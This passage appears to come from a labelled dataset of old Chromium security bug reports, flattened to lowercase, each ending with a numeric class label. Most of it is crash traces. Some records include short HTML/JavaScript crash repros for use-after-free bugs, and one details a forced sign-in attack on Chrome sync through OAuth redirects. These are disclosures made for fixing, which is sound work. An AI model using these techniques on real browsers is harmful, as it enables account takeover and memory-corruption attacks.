source std basic_string char std char_traits char std allocator char base value cdecl net netlog source const std basic_string char std char_traits char std allocator char const enum net netlog loglevel run c b\build\slave\win-asan\build\src\base\bind_internal.h 1353 chrome disk_cache inflightbackendio onoperationcomplete c b\build\slave\win-asan\build\src\net\disk_cache\in_flight_backend_io.cc 509 chrome disk_cache inflightio invokecallback c b\build\slave\win-asan\build\src\net\disk_cache\in_flight_io.cc 101 chrome disk_cache backgroundio oniosignalled c b\build\slave\win-asan\build\src\net\disk_cache\in_flight_io.cc 22 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop.cc 670 chrome base messagepumpforio dorunloop c b\build\slave\win-asan\build\src\base\message_pump_win.cc 523 chrome stdext exception what perf chrome_5c9b0000 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop.cc 432 chrome stdext exception what perf chrome_5c9b0000 chrome base thread run c b\build\slave\win-asan\build\src\base\threading\thread.cc 152 chrome content browserthreadimpl iothreadrun c b\build\slave\win-asan\build\src\content\browser\browser_thread_impl.cc 163 chrome content browserthreadimpl run c b\build\slave\win-asan\build\src\content\browser\browser_thread_impl.cc 190 free stack trace asan_rtl agent asan heapproxy free e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 232 asan_rtl asan_heapfree e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 128 chrome operator delete c b\build\slave\win-asan\build\src\base\allocator\allocator_shim.cc 157 chrome scoped_refptr net sslclientsocketnss core operator c b\build\slave\win-asan\build\src\base\memory\ref_counted.h 267 chrome net sslclientsocketnss initcore c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 3091 chrome net sslclientsocketnss disconnect c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 2967 chrome stdext exception what perf chrome_5c9b0000 chrome stdext exception what perf chrome_5c9b0000 chrome net httpnetworktransaction doreadheaderscomplete c b\build\slave\win-asan\build\src\net\http\http_network_transaction.cc 871 chrome net httpnetworktransaction doloop c b\build\slave\win-asan\build\src\net\http\http_network_transaction.cc 593 chrome net httpnetworktransaction oniocomplete c b\build\slave\win-asan\build\src\net\http\http_network_transaction.cc 523 chrome base internal invoker 1 base internal bindstate base internal runnableadapter void thiscall remoting protocol anonymous namespace libjinglestreamtransport int void cdecl remoting protocol anonymous namespace libjinglestreamtransport int void cdecl base internal unretainedwrapper remoting protocol anonymous namespace libjinglestreamtransport void cdecl remoting protocol anonymous namespace libjinglestreamtransport int run c b\build\slave\win-asan\build\src\base\bind_internal.h 1228 chrome net httpstreamparser oniocomplete c b\build\slave\win-asan\build\src\net\http\http_stream_parser.cc 355 chrome base internal invokehelper 1 void base internal runnableadapter void thiscall webkit ppapi quotafileio setlengthoperation enum base platformfileerror void cdecl base weakptr webkit ppapi quotafileio setlengthoperation const enum base platformfileerror const makeitso c b\build\slave\win-asan\build\src\base\bind_internal.h 911 chrome base internal invoker 1 base internal bindstate base internal runnableadapter void thiscall webkit ppapi quotafileio setlengthoperation enum base platformfileerror void cdecl webkit ppapi quotafileio setlengthoperation enum base platformfileerror void cdecl base weakptr webkit ppapi quotafileio setlengthoperation void cdecl webkit ppapi quotafileio setlengthoperation enum base platformfileerror run c b\build\slave\win-asan\build\src\base\bind_internal.h 1228 chrome base internal invoker 1 base internal bindstate base callback void cdecl ipc message const void cdecl ipc message const void cdecl ipc message void cdecl ipc message const run c b\build\slave\win-asan\build\src\base\bind_internal.h 1173 chrome net sslclientsocketnss core postorruncallback c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 2750 chrome net sslclientsocketnss core doreadcallback c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 2311 chrome net sslclientsocketnss core onsendcomplete c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 2272 chrome net sslclientsocketnss core buffersendcomplete c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 2680 chrome base internal invoker 1 base internal bindstate base internal runnableadapter void thiscall net anonymous namespace dnsudpattempt int void cdecl net anonymous namespace dnsudpattempt int void cdecl base internal unretainedwrapper net anonymous namespace dnsudpattempt void cdecl net anonymous namespace dnsudpattempt int run c b\build\slave\win-asan\build\src\base\bind_internal.h 1229 chrome net tcpclientsocketwin dowritecallback c b\build\slave\win-asan\build\src\net\socket\tcp_client_socket_win.cc 911 chrome net tcpclientsocketwin didcompletewrite c b\build\slave\win-asan\build\src\net\socket\tcp_client_socket_win.cc 1003 chrome stdext exception what perf chrome_5c9b0000 chrome base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall base win objectwatcher base win objectwatcher delegate void cdecl base win objectwatcher base win objectwatcher delegate void cdecl base weakptr base win objectwatcher base win objectwatcher delegate void cdecl base win objectwatcher base win objectwatcher delegate run c b\build\slave\win-asan\build\src\base\bind_internal.h 1258 chrome stdext exception what perf chrome_5c9b0000 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop.cc 670 chrome base messagepumpforio dorunloop c b\build\slave\win-asan\build\src\base\message_pump_win.cc 523 chrome stdext exception what perf chrome_5c9b0000 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop.cc 432 chrome stdext exception what perf chrome_5c9b0000 chrome base thread run c b\build\slave\win-asan\build\src\base\threading\thread.cc 152 chrome content browserthreadimpl iothreadrun c b\build\slave\win-asan\build\src\content\browser\browser_thread_impl.cc 163 chrome content browserthreadimpl run c b\build\slave\win-asan\build\src\content\browser\browser_thread_impl.cc 190	11
flash settings menu vulnerable to clickjacking explanation here the gist is that you can make the flash settings frame transparent and put it on top of the misleading content	2
security spawn multiple windows in response to a single user interaction hey can i merge and on m28 those are actively used by e.g jquery-popunder both have been on trunk for a month now without causing any trouble	11
security npapi extension can be synced as reported by andrey labunets isciurus gmail.com in issue 252010 npapi plugins can be synced quoting him finally chrome sync is used to install an extension with npapi plugin and execute code though extensions with plugins can not be installed through sync directly they can be auto-updated and the new version may contain plugins to reproduce this open two browsers and perform chrome signin on both with the same account then do the following 1 create an extension without plugins but with a special plugin permission in the permissions list 2 install this extension in the first browser instance and observe it appearing in the parallel browser instance 3 upload the new version of the extension now with a dll inside and with plugins section in manifest 4 install any other extension from webstore in the first browser instance just to trigger auto-update in the second instance	2
security use-after-free in net socketstream finish originally reported in issue 225546 by therealholden i m spinning this off as it s a separate issue it s still workers related though the attached repro hits a uaf in socketstream finish asan trace 1361==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t15 chrome_iothread 0 in net socketstream finish int src/blink/src/out/release net/socket_stream/socket_stream.cc:364 1 in net socketstream doloop int src/blink/src/out/release net/socket_stream/socket_stream.cc:555 2 in base callback void int run int const const src/blink/src/out/release base/callback.h:436 3 in net tcpclientsocketlibevent didcompleteconnect src/blink/src/out/release net/socket/tcp_client_socket_libevent.cc:671 4 in base messagepumplibevent filedescriptorwatcher onfilecanwritewithoutblocking int base messagepumplibevent src/blink/src/out/release base/message_pump_libevent.cc:110 5 in base messagepumplibevent onlibeventnotification int short void src/blink/src/out/release base/message_pump_libevent.cc:354 6 in event_process_active src/blink/src/out/release third_party/libevent/event.c:385 7 in base messagepumplibevent run base messagepump delegate src/blink/src/out/release base/message_pump_libevent.cc:239 8 in base messageloop runinternal src/blink/src/out/release base/message_loop.cc:441 9 in base runloop run src/blink/src/out/release base/run_loop.cc:45 10 in base messageloop run src/blink/src/out/release base/message_loop.cc:321 11 in content browserthreadimpl iothreadrun base messageloop src/blink/src/out/release content/browser/browser_thread_impl.cc:164 12 in content browserthreadimpl run base messageloop src/blink/src/out/release content/browser/browser_thread_impl.cc:192 13 in base thread threadmain src/blink/src/out/release base/threading/thread.cc:197 14 in base anonymous namespace threadfunc void src/blink/src/out/release base/threading/platform_thread_posix.cc:95 15 in asan asanthread threadstart unsigned long 0 16 in start_thread build/buildd/eglibc-2.15/nptl/pthread_create.c:308 17 in build/buildd/eglibc-2.15/misc sysdeps/unix/sysv/linux/x86_64/clone.s:112 is located 24 bytes inside of 336-byte region freed by thread t15 chrome_iothread here 0 in operator delete void 0 1 in base refcountedthreadsafe net socketstreamjob base defaultrefcountedthreadsafetraits net socketstreamjob deleteinternal net socketstreamjob const src/blink/src/out/release base/memory/ref_counted.h:151 2 in content socketstreamdispatcherhost deletesocketstreamhost int src/blink/src/out/release content/browser/renderer_host/socket_stream_dispatcher_host.cc:237 3 in content socketstreamdispatcherhost onerror net socketstream const int src/blink/src/out/release content/browser/renderer_host/socket_stream_dispatcher_host.cc:117 4 in net socketstream finish int src/blink/src/out/release net/socket_stream/socket_stream.cc:362 5 in net socketstream doloop int src/blink/src/out/release net/socket_stream/socket_stream.cc:555 6 in base callback void int run int const const src/blink/src/out/release base/callback.h:436 7 in net tcpclientsocketlibevent didcompleteconnect src/blink/src/out/release net/socket/tcp_client_socket_libevent.cc:671 8 in base messagepumplibevent filedescriptorwatcher onfilecanwritewithoutblocking int base messagepumplibevent src/blink/src/out/release base/message_pump_libevent.cc:110 9 in base messagepumplibevent onlibeventnotification int short void src/blink/src/out/release base/message_pump_libevent.cc:354 10 in event_process_active src/blink/src/out/release third_party/libevent/event.c:385 11 in base messagepumplibevent run base messagepump delegate src/blink/src/out/release base/message_pump_libevent.cc:239 12 in base messageloop runinternal src/blink/src/out/release base/message_loop.cc:441 13 in base runloop run src/blink/src/out/release base/run_loop.cc:45 14 in base messageloop run src/blink/src/out/release base/message_loop.cc:321 15 in content browserthreadimpl iothreadrun base messageloop src/blink/src/out/release content/browser/browser_thread_impl.cc:164 16 in content browserthreadimpl run base messageloop src/blink/src/out/release content/browser/browser_thread_impl.cc:192 17 in base thread threadmain src/blink/src/out/release base/threading/thread.cc:197 18 in base anonymous namespace threadfunc void src/blink/src/out/release base/threading/platform_thread_posix.cc:95 19 in asan asanthread threadstart unsigned long 0 previously allocated by thread t15 chrome_iothread here 0 in operator new unsigned long 0 1 in anonymous namespace websocketjobfactory gurl const net socketstream delegate src/blink/src/out/release net/websockets/websocket_job.cc:40 2 in net socketstreamjobmanager createjob gurl const net socketstream delegate const src/blink/src/out/release net/socket_stream/socket_stream_job_manager.cc:37 3 in net socketstreamjob createsocketstreamjob gurl const net socketstream delegate net transportsecuritystate net sslconfigservice src/blink/src/out/release net/socket_stream/socket_stream_job.cc:39 4 in content socketstreamhost connect gurl const net urlrequestcontext src/blink/src/out/release content/browser/renderer_host/socket_stream_host.cc:62 5 in content socketstreamdispatcherhost onconnect int gurl const int src/blink/src/out/release content/browser/renderer_host/socket_stream_dispatcher_host.cc:208 6 in void dispatchtomethod content socketstreamdispatcherhost void content socketstreamdispatcherhost int gurl const int int gurl int content socketstreamdispatcherhost void content socketstreamdispatcherhost int gurl const int tuple3 int gurl int const src/blink/src/out/release base/tuple.h:559 7 in content browsermessagefilter dispatchmessage ipc message const src/blink/src/out/release content/public/browser/browser_message_filter.cc:136 8 in content browsermessagefilter onmessagereceived ipc message const src/blink/src/out/release content/public/browser/browser_message_filter.cc:52 9 in content childprocesshostimpl onmessagereceived ipc message const src/blink/src/out/release content/common/child_process_host_impl.cc:237 10 in non-virtual thunk to content childprocesshostimpl onmessagereceived ipc message const src/blink/src/out/release content/common/child_process_host_impl.cc:262 11 in ipc internal channelreader dispatchinputdata char const int src/blink/src/out/release ipc/ipc_channel_reader.cc:90 12 in ipc internal channelreader processincomingmessages src/blink/src/out/release ipc/ipc_channel_reader.cc:32 13 in ipc channel channelimpl onfilecanreadwithoutblocking int src/blink/src/out/release ipc/ipc_channel_posix.cc:641 14 in base messagepumplibevent filedescriptorwatcher onfilecanreadwithoutblocking int base messagepumplibevent src/blink/src/out/release base/message_pump_libevent.cc:102 15 in event_process_active src/blink/src/out/release third_party/libevent/event.c:385 16 in base messagepumplibevent run base messagepump delegate src/blink/src/out/release base/message_pump_libevent.cc:239 17 in base messageloop runinternal src/blink/src/out/release base/message_loop.cc:441 18 in base runloop run src/blink/src/out/release base/run_loop.cc:45 19 in base messageloop run src/blink/src/out/release base/message_loop.cc:321 20 in content browserthreadimpl iothreadrun base messageloop src/blink/src/out/release content/browser/browser_thread_impl.cc:164 21 in content browserthreadimpl run base messageloop src/blink/src/out/release content/browser/browser_thread_impl.cc:192 22 in base thread threadmain src/blink/src/out/release base/threading/thread.cc:197 23 in base anonymous namespace threadfunc void src/blink/src/out/release base/threading/platform_thread_posix.cc:95 24 in asan asanthread threadstart unsigned long 0 thread t15 chrome_iothread created by t0 chrome here 0 in pthread_create 0 1 in base anonymous namespace createthread unsigned long bool base platformthread delegate unsigned long base threadpriority src/blink/src/out/release base/threading/platform_thread_posix.cc:159 2 in base platformthread create unsigned long base platformthread delegate unsigned long src/blink/src/out/release base/threading/platform_thread_posix.cc:260 3 in base thread startwithoptions base thread options const src/blink/src/out/release base/threading/thread.cc:93 4 in content browsermainloop createthreads src/blink/src/out/release content/browser/browser_main_loop.cc:524 5 in content browsermainrunnerimpl initialize content mainfunctionparams const src/blink/src/out/release content/browser/browser_main_runner.cc:112 6 in content browsermain content mainfunctionparams const src/blink/src/out/release content/browser/browser_main.cc:18 7 in content runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate src/blink/src/out/release content/app/content_main_runner.cc:449 8 in content contentmainrunnerimpl run src/blink/src/out/release content/app/content_main_runner.cc:772 9 in content contentmain int char const content contentmaindelegate src/blink/src/out/release content/app/content_main.cc:35 10 in chromemain src/blink/src/out/release chrome/app/chrome_main.cc:32 11 in main src/blink/src/out/release chrome/app/chrome_exe_main_gtk.cc:39 12 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 1361==aborting	11
urlrequestcontext can be deleted while a live socketstream has a pointer to it vtable uaf when socketstream connect is called it defers most of the work to dobeforeconnect which is called via a task posted to the messageloop however the urlrequestcontext object used by dobeforeconnect can be deleted via destruction of profileiodata in-between these two calls	11
heap-use-after-free in webcore styledelement ensuremutableinlinestyle vulnerability details use-after-free wit input and x-webkit-speech version chrome version stable+dev operating system ubuntu 64bit reproduction case html head script onload function el0=document.createelement input document.body.appendchild el0 el0.type='month el0.focus window.addeventlistener focusout function el0.type='date false el0.setattribute x-webkit-speech script head body body html for crashes please include the following additional information type of crash renderer asan crash state 32687 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 asan-stable 0 in get mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/wtf/refptr.h:58:0 1 in elementdata mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/webcore/dom/element.h:385:0 2 in ensureuniqueelementdata is located 88 bytes inside of 112-byte region freed by thread t0 asan-stable here 0 in operator delete void 0 1 in deref mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/webcore/platform/treeshared.h:81:0 2 in derefifnotnull webcore node mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/wtf/passrefptr.h:53:0 3 in refptr	9
heap-use-after-free in webcore inputtype stepupfromrenderer vulnerability details use-after-free in webcore inputtype stepupfromrenderer int version chrome version stable+dev operating system linux 64bit osx reproduction case user interaction required you must press up or down arrows when the input is focused html head script onload function el0=document.createelement input el0.type='number document.body.appendchild el0 window.addeventlistener change function el0.type false el0.focus script head body press up or down arrows body html for crashes please include the following additional information type of crash renderer asan crash state 13639 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 asan-stable 0 in element mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/webcore/html/inputtype.h:317:0 1 in webcore inputtype stepupfromrenderer int mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/webcore/html/inputtype.cpp:1117:0 2 in webcore textfieldinputtype handlekeydowneventforspinbutton webcore keyboardevent mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/webcore/html/textfieldinputtype.cpp:161:0 3 in webcore numberinputtype handlekeydownevent webcore keyboardevent is located 8 bytes inside of 72-byte region freed by thread t0 asan-stable here 0 in free 0 1 in deleteownedptr webcore inputtype mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/wtf/ownptrcommon.h:63:0 2 in operator mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/wtf/ownptr.h:141:0 3 in webcore htmlinputelement updatetype	9
nss is unable to open dev/urandom on os x resulting in insufficient entropy for renderers this was reported externally by eric rescorla ekr rtfm.com the os x sandbox for renderer processes does not allow dev/urandom to be opened nss relies on dev/urandom for entropy including the generation of ephemeral keys used for the peer-to-peer dtls negotiation/session establishment dev/urandom is explicitly whitelisted for pepper plugins see chromium/src/content/ppapi_plugin/ppapi.sb q=file 5c.sb sq=package chromium type=cs l=24 but not whitelisted for content processes on linux/posix we explicitly intercept fopen/fopen64 so that we can whitelist dev/urandom see chromium/src/sandbox/linux/services/libc_urandom_override.cc q=fopen 20sandbox sq=package chromium type=cs l=1 is there any reason why we should n't be whitelisting dev/urandom in the src/content/common/common.sb sandbox policy	4
heap-use-after-free in webkit_glue weburlloaderimpl context onreceivedresponse vulnerability details use-after-free with showmodaldialog version chrome version stable dev operating system ubuntu 64bit reproduction case script type text/javascript src x script script type text/javascript showmodaldialog javascript close script for crashes please include the following additional information type of crash tab+asan crash state 9300==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 asan-release 0 in onreceivedresponse b/build/slave/asan_release/build/src/out/release webkit/glue/weburlloader_impl.cc:658 1 in onreceivedresponse b/build/slave/asan_release/build/src/out/release content/common/resource_dispatcher.cc:349 2 in dispatchtomethod content resourcedispatcher void content resourcedispatcher int const content resourceresponsehead int content resourceresponsehead b/build/slave/asan_release/build/src/out/release base/tuple.h:553 is located 32 bytes inside of 80-byte region freed by thread t0 asan-release here 0 in operator delete void 0 1 in release b/build/slave/asan_release/build/src/out/release base/memory/ref_counted.h:92 2 in deleteownedptr webkit weburlloader b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/ownptrcommon.h:47 3 in deleteownedptr webcore resourcehandleinternal b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/ownptrcommon.h:47	11
assertion failed run.characterslength run.length heap-buffer-overflow in webcore font characterrangecodepath detailed report fuzzer miaubiz_svg_fuzzer crash type heap-buffer-overflow read 2 crash address crash state crash stack webcore font characterrangecodepath webcore font drawtext webcore svginlinetextbox painttextwithshadows minimized testcase 9.60 kb	11
interstitials allow bypass of extension permissions useragent mozilla/5.0 x11 linux i686 applewebkit/537.22 khtml like gecko chrome/25.0.1364.172 safari/537.22 steps to reproduce the problem 1 install awesome screenshot extension from the webstore and say the tweetdeck extension 2 open tweetdeck and try to take screenshot this will fail since awesome screenshot does n't have permission for tweetdeck 3 now on the tweetdeck tab open any page with an interstitial warning or 4 take screenshot with awesome screenshot capture visible part of page what is the expected behavior no screenshot of tweetdeck screenshot of warning instead what went wrong you get to see all tweets on tweetdeck did this work before n/a chrome version 25.0.1364.172 channel n/a os version crbug.com/19551 is also related	2
input pointer corruption in xmlparsetryorfinish detailed report fuzzer aki_radamsa crash type unknown crash address crash state crash stack xmlparsetryorfinish xmlparsechunk webcore xmldocumentparser dowrite regressed minimized testcase 0.11 kb download xml-stylesheet type application/xml href svg_passer.xslt svg xmlns	7
security an attacker can sign-in a victim to his own account as reported by andrey labunets isciurus gmail.com in issue 252010 the sign-in process can be subverted to log-in a victim into an attacker s account this has a high security impact because of chrome sync to quote him at this point victim is signed into attacker s google account but to sign him in chrome in order to perform an account sync requires additional effort the main defense for chrome sync/signin is based on the fact that all signin operations should originate from a trusted sign-in renderer process for now there exist two different variations of approach 1 on stable codebase from stable channel has strict rule to accept email as a candidate in the only one case if the target renderer is the signin-renderer chrome\browser\ui\sync\one_click_signin_helper.cc bool oneclicksigninhelper canoffer content webcontents web_contents only allow the dedicated signin process to sign the user into chrome without intervention because it does n't load any untrusted pages in the interstitial case since chrome will display a modal dialog we do n't need to make this check if can_offer_for can_offer_for_all manager issigninprocess web_contents getrenderprocesshost getid return false the statement it does n't load any untrusted pages is not true due to poor signin web-flow identification logic and renderer processes behaviour using oauth redirects we can load any url in the signin renderer and then invoke a legit signin request from there w window.open null signin w.opener null w.document.location.replace here window.open along with opener null forces chrome to load url in a new renderer but when searching for the appropriate renderer type and looking at the url chrome decides that this is actually a web-based signin flow chrome\browser\chrome_content_browser_client.cc void chromecontentbrowserclient siteinstancegotprocess we only expect there to be one signin process as we use process-per-site for signin urls the signin process will be cleared from signinmanager when the renderer is destroyed if signinmanager iswebbasedsigninflowurl site_instance getsiteurl signinmanager signin_manager signinmanagerfactory getforprofile profile if signin_manager signin_manager setsigninprocess site_instance getprocess getid chrome\browser\signin\signin_manager.cc bool signinmanager iswebbasedsigninflowurl const gurl url gurl effective kchromesignineffectivesite if url.schemeis effective.scheme c_str url.host effective.host return true gurl service_login gaiaurls getinstance service_login_url if url.getorigin service_login.getorigin domain should be accounts.google.com return false any login ui urls with signin=chromiumsync should be considered a web signin=chromiumsync should be in query url relies on gaia keeping the service=chromiumsync query string fragment present even when embedding inside a continue parameter return net unescapeurlcomponent url.query net unescaperule url_special_chars find kchromiumsyncservice std string npos but what really happens is that the oauth 2.0 endpoint at o/oauth2/auth is being reached which in turn 302-redirects the browser to your_redirect_uri without token of course note that the renderer is not destroyed upon receiving 302 code even with cross-domain redirects now inside the trusted signin process we submit the login form and initiate the signin flow repro steps in repro_stable.zip or directly at do n't forget to use a new profile in chrome or just clear the galx=abc cookie from previous experiments unfortunately the signin will happen if only user is not already signed in chrome under its own account 2 on dev signin is designed a bit differently on development channel now it allows signing in from an untrusted renderer but shows a confirmation dialog in this case chrome\browser\ui\sync\one_click_signin_helper.cc only allow the dedicated signin process to sign the user into chrome without intervention because it does n't load any untrusted pages if at any point an untrusted page is detected chrome will show a modal dialog asking the user to confirm helper untrusted_confirmation_required manager manager issigninprocess child_id but if the user is supposed to turn on the sync manually chrome signs this user in without any confirmation chrome\browser\ui\sync\one_click_signin_helper.cc void startsync const startsyncargs args if we are giving the user the option to configure sync then that will suffice as a confirmation oneclicksigninsyncstarter confirmationrequired confirmation args.confirmation_required if start_mode oneclicksigninsyncstarter configure_sync_first confirmation oneclicksigninsyncstarter confirm_untrusted_signin confirmation oneclicksigninsyncstarter confirm_after_signin once the user is signed in it becomes possible to re-sign him again now with sync turned on automatically chrome\browser\ui\sync\one_click_signin_sync_starter.cc void oneclicksigninsyncstarter confirmsignin const std string oauth_token dcheck oauth_token.empty signinmanager signin signinmanagerfactory getforprofile profile if this is a new signin no authenticated username yet try loading policy for this user now before any signed in services are initialized this callback is only invoked for the web-based signin flow for the old clientlogin flow policy will get loaded once the tokenservice finishes initializing not ideal but it s a reasonable fallback if signin getauthenticatedusername empty getauthenticatedusername is now set if defined enable_configuration_policy policy userpolicysigninservice policy_service policy userpolicysigninservicefactory getforprofile profile policy_service registerpolicyclient signin getusernameforauthinprogress oauth_token base bind oneclicksigninsyncstarter onregisteredforpolicy weak_pointer_factory_.getweakptr return else confirmandsignin endif else the user is already signed in just tell signinmanager to continue with its re-auth flow signin completependingsignin starts sync without confirmation repro at repro_dev.zip or directly at again do n't forget to use new profile and you also should not be signed in to chrome initially	2
swiftshader images do not use aslr several modules in canary do not take advantage of aslr libegl.dll libglesv2.dll	11
global-buffer-overflow in webcore font expansionopportunitycount detailed report fuzzer bj_broddelwerk crash type global-buffer-overflow read 1 crash address crash state crash stack webcore font expansionopportunitycount webcore renderblock computeinlinedirectionpositionsforsegment webcore renderblock computeinlinedirectionpositionsforline regressed minimized testcase 8.78 kb	11
zero-sized textures must be considered incomplete the command buffer service side code must consider textures with zero width or height at level 0 to be incomplete	11
tracking bug for internal security fixes for chrome 28 release 0 see high high medium high high high high medium high high medium high high high high high medium medium high medium medium high high medium high medium high high high high high medium high medium low high medium	11
crash in base deletehelper safe_browsing downloadprotectionservice checkclientdownloadrequest dodelete void const splitting this off of issue 238842 which was getting confused between two crashes crash id 1762ff08efc10fda crash call stack chrome.dll sequenced_task_runner_helpers.h:39 base deletehelper safe_browsing downloadprotectionservice checkclientdownloadrequest dodelete void const chrome.dll bind_internal.h:1173 base internal invoker 1 base internal bindstate base internal runnableadapter void void const void void const void void const void void const run base internal bindstatebase chrome.dll message_loop.cc:473 messageloop runtask base pendingtask const chrome.dll message_loop.cc:443 messageloop processnextdelayednonnestabletask chrome.dll message_loop.cc:710 messageloop doidlework chrome.dll message_pump_win.cc:259 base messagepumpforui dorunloop chrome.dll message_loop.cc:425 messageloop runinternal chrome.dll run_loop.cc:45 base runloop run chrome.dll chrome_browser_main.cc:1517 chromebrowsermainparts mainmessagelooprun int chrome.dll browser_main_loop.cc:480 content browsermainloop runmainmessageloopparts chrome.dll browser_main_runner.cc:118 content browsermainrunnerimpl run chrome.dll browser_main.cc:22 content browsermain content mainfunctionparams const chrome.dll content_main_runner.cc:450 content runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate chrome.dll content_main_runner.cc:755 content contentmainrunnerimpl run chrome.dll content_main.cc:35 content contentmain hinstance sandbox sandboxinterfaceinfo content contentmaindelegate chrome.dll chrome_main.cc:28 chromemain chrome.exe client_util.cc:440 maindllloader launch hinstance sandbox sandboxinterfaceinfo chrome.exe chrome_exe_main_win.cc:81 runchrome hinstance chrome.exe chrome_exe_main_win.cc:97 wwinmain	11
assertion failed m_deletionhasbegun unknown in webcore deviceorientationevent deviceorientationevent detailed report fuzzer inferno_twister crash type unknown crash address crash state crash stack webcore deviceorientationevent deviceorientationevent webcore htmltrackelement removedfrom void webcore private addchildnodestodeletionqueue webcore node webcore containernode regressed minimized testcase 1.83 kb	11
use-after-free on webcore formcontroller createsavedformstatemap this crash has been found by the last syzyasan canary 28.0.1490.1 we ve seen it 1 time error type read of size 4 alloc_stack 62 void alloc_stack_size 9 free_stack 62 void free_stack_size 9 error_type 1 use_after_free shadow_info 128 is located 779 bytes inside of 768-bytes region stack trace of the crash chrome webcore formcontroller createsavedformstatemap c b\build\slave\win-asan\build\src\third_party\webkit\source\core\html\formcontroller.cpp 403 chrome webcore formcontroller formelementsstate c b\build\slave\win-asan\build\src\third_party\webkit\source\core\html\formcontroller.cpp 416 chrome webcore historycontroller savedocumentstate c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\historycontroller.cpp 158 chrome webcore historycontroller createitemtree c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\historycontroller.cpp 593 chrome webcore historycontroller pushstate c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\historycontroller.cpp 760 chrome webcore history stateobjectadded c b\build\slave\win-asan\build\src\third_party\webkit\source\core\page\history.cpp 151 chrome webcore v8history pushstatemethodcustom c b\build\slave\win-asan\build\src\third_party\webkit\source\bindings\v8\custom\v8historycustom.cpp 72 chrome webcore historyv8internal pushstatemethodcallback c b\build\slave\win-asan\build\src\build\release\obj\global_intermediate\webcore\bindings\v8history.cpp 260 chrome v8 internal handleapicallhelper 0 c b\build\slave\win-asan\build\src\v8\src\builtins.cc 1327 chrome v8 internal builtin_handleapicall c b\build\slave\win-asan\build\src\v8\src\builtins.cc 1345 allocation stack trace asan_rtl agent asan heapproxy alloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 191 asan_rtl asan_heapalloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 100 chrome generic_cpp_alloc c b\build\slave\win-asan\build\src\base\allocator\generic_allocators.cc 16 chrome std vector unsigned char std allocator unsigned char reserve c program files x86 microsoft visual studio 10.0\vc\include\vector 1298 chrome std vector unsigned char std allocator unsigned char resize c program files x86 microsoft visual studio 10.0\vc\include\vector 864 chrome skia bgraconvolve2d c b\build\slave\win-asan\build\src\skia\ext\convolver.cc 417 chrome skia imageoperations resizebasic c b\build\slave\win-asan\build\src\skia\ext\image_operations.cc 523 chrome webcore nativeimageskia resizedbitmap c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\nativeimageskia.cpp 97 chrome webcore extractscaledimagefragment c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 283 chrome webcore drawresampledbitmap c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 322 chrome webcore paintskbitmap c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 390 chrome webcore bitmapimage draw c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 657 chrome webcore bitmapimage draw c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 610 chrome webcore image drawtiled c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\image.cpp 136 chrome webcore graphicscontext 